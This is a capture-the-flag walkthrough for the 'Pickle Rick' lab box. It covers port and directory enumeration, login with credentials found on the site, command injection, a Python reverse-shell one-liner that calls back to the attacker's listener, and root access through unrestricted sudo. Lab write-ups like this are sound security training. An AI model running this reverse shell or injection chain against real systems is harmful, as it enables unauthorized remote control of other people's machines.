## Pickle Rick CTF
---

**IP: 10.10.86.171[22,80]**
### Enumeration

#### Nmap:
`nmap -sV -vv -Pn -T5 -p- -oG nmap.txt 10.10.86.171 | tee -a PickleRick.md`
from this scan were able to locate two open ports
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
#### Gobuster:
`gobuster dir -e -u http://10.10.86.171/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,css,js,py`
from here we identified a series of web pages to further enumerate.
The purpose of the `-x` is to further specify extensions to find. this directory list is extremely useful for this specific task, unlike rockyou, which is for password cracking.
```
gobuster dir -e -u http://10.10.86.171/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,css,js,py
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.86.171/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     py,php,sh,txt,cgi,html,css,js
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/02/07 09:59:01 Starting gobuster
===============================================================
http://10.10.86.171/index.html (Status: 200)
http://10.10.86.171/login.php (Status: 200)
http://10.10.86.171/assets (Status: 301)
http://10.10.86.171/portal.php (Status: 302)
http://10.10.86.171/robots.txt (Status: 200)
```

| **Enumeration** | **Results**|
| :--- | :---: |
| Within page source on the homepage:  | Username: R1ckRul3s |
| within robots.txt | Wubbalubbadubdub |
| The above two worked for successful authentication on `login.php` | authenticated to `portal.php`  |

---
## Command Injection

Long story short, we could inject commands but were unable to view files with `cat` we could use `grep . -R` to view everything at once though, and pulled our first ingredient from that.
`Python3 --version` spit back a version number so this indicated we could use a payload for a reverse shell.

#### code provided by pentest monkey
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

#### Setting parameters
`ip addr` Identify your address, specifcally from `tun0` as your VPN IP.
`nc -lnvp 9999` set up a netcat listener on your machine for the reverse shell.

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.52.142",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

---
### Exploitation

We now had a non-interactive shell on the machine.
```listening on [any] 9999 ...
connect to [10.6.52.142] from (UNKNOWN) [10.10.86.171] 57228
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
from here we saw this user is a sudoer
```
$ sudo -l
Matching Defaults entries for www-data on
    ip-10-10-86-171.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-86-171.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```
 naturally,

 ```
 cd ../../../../
pwd
/
sudo ls -l root
total 8
-rw-r--r-- 1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x 3 root root 4096 Feb 10  2019 snap
sudo cat root/3rd.txt
3rd ingredients: fleeb juice
```

That's the second ingredient

```
cd /home
ls
rick
ubuntu
cd rick
ls -l
total 4
-rwxrwxrwx 1 root root 13 Feb 10  2019 second ingredients
cat *
1 jerry tear
```

That's the final ingredient.
